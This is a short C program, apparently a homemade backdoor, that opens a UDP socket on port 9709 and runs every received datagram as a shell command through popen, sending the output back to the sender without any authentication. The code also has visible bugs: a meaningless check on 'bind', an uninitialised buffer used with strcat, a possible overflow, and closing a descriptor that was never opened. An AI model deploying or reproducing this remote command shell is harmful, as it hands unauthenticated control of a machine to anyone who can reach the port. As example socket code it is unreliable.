#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>

void error(const char *msg) 
{
	perror(msg);
	exit(1);
				}
				
				
int main ()
{
int sokd;
int plugd;
int pord;
int n;
char buffer[9000];
char command[9000];

FILE *fp;
char path[5000];



struct sockaddr_in serv_addr, cli_addr;
socklen_t clilen = sizeof(cli_addr);


			sokd = socket(AF_INET, SOCK_DGRAM,0);
							if(sokd < 0){error("Error opening socket!");}

bzero(&serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
serv_addr.sin_port = htons(9709);


			bind(sokd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
							if(bind < 0){error("Binding Failed");}


	while(1)
	{	
	bzero(buffer, sizeof(buffer));
	recvfrom(sokd, buffer, sizeof(buffer), 0, (struct sockaddr *)&cli_addr, &clilen);
	
	//system stuff
	printf("\n[+]Client: %s ", buffer);
	fp = popen(buffer, "r");
	while (fgets(path, sizeof(path), fp) != NULL)
	{strcat(command, path);}
	
	
	sendto(sokd, command, sizeof(command), 0, (struct sockaddr *)&cli_addr, clilen);
	
	strcpy(command, "");
	
	
	
	int i = strncmp("bye", buffer, 3);
	int j = strncmp("Bye", buffer, 3);
	int k = strncmp("BYE", buffer, 3);
	if(i == 0 || j == 0 || k == 0)
	break;
	
	}
	close(plugd);
	close(sokd);
	


}
